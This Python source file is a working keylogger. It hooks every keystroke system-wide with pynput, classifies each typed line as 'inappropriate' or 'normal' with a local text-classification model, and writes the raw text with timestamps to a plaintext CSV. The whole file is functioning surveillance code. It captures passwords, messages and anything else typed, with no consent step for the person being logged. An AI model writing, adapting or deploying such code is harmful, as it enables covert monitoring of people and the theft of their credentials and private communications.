from pynput import keyboard
from transformers import pipeline
from datetime import datetime
import threading
import csv
import os

# --- Global Variables ---
model = None
model_loaded = threading.Event()  # To prevent double-loading
log = ""
csv_file = "keylogger_results.csv"
next_id = 1

# Label mapping from model output
label_map = {
    "LABEL_0": "inappropriate",
    "LABEL_1": "normal",
    "LABEL_2": "normal"
}

# --- Ensure CSV Exists ---
if not os.path.exists(csv_file):
    with open(csv_file, mode="w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["ID", "Timestamp", "Content", "Label"])

# --- Model Loading ---
def preload_model():
    global model
    model = pipeline("text-classification", model="./behavior_model", device=-1)
    model_loaded.set()  # Signal that the model is ready

# --- AI Analysis Function ---
def analyze_sentence(sentence):
    global model
    if not model_loaded.is_set():
        print("Loading model (fallback)...", flush=True)
        model = pipeline("text-classification", model="./behavior_model", device=-1)
        model_loaded.set()

    result = model(sentence)
    label = result[0]['label']
    readable_label = label_map.get(label, "normal")
    score = result[0]['score']
    return readable_label, score

# --- Key Press Handler ---
def on_key_press(key):
    global log
    try:
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        elif key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
            analyze_and_save()
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        else:
            log += f' [{key}] '
    except Exception as e:
        print(f"Error processing key press: {e}", flush=True)

# --- Analyze and Save ---
def analyze_and_save():
    global log, next_id
    sentence = log.strip()
    if sentence:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        label, score = analyze_sentence(sentence)
        print(f"\nUser input: {sentence}", flush=True)
        print(f"Detected as: {label} with score: {score:.2f}", flush=True)

        try:
            with open(csv_file, mode="a", newline="") as file:
                writer = csv.writer(file)
                writer.writerow([next_id, timestamp, sentence, label])
            next_id += 1
        except Exception as e:
            print(f"Error saving to CSV: {e}", flush=True)

    log = ""

# --- Keylogger Threading ---
def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    print("Keylogger started. Press Enter to analyze. Ctrl+C to stop.", flush=True)
    listener.join()

def run_keylogger():
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Exiting...", flush=True)

# --- Main Execution ---
if __name__ == "__main__":
    # Preload model in background
    threading.Thread(target=preload_model, daemon=True).start()

    # Run keylogger in separate thread
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    try:
        while keylogger_thread.is_alive():
            keylogger_thread.join(1)
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user. Exiting...", flush=True)
